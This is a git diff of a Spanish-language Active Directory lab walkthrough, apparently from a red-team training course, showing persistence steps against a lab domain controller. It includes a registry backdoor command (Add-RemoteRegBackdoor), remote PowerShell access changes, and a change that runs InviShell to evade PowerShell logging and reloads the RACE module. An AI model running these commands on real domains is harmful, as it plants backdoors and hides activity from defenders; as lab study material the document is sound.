@@ -1064,11 +1064,14 @@ Set-RemotePSRemoting -SamAccountName student867 -ComputerName dcorp-dc.dollarcor
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student867 -Verbose
 ```
 
-
-Y a continuacion modificaremso los descriptores de seguridad del host para *WMI* en el *DC* para permitir el acceso de estudiante a *WMI*
+Ahora desde una nueva shell ejecutaremos *InviShell* y verificaremos si se han aplicado los cambios
 ```shell
-[student97]
-Set-RemoteWMI -SamAccountName student97 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+Volveremos a cargar el modulo de *RACE*
+```shell
+. C:\AD\Tools\RACE.ps1
 ```
 
 Ahora ya podemos ejecutar consultas *WMI* en el *Domain COntroller* como *student97*
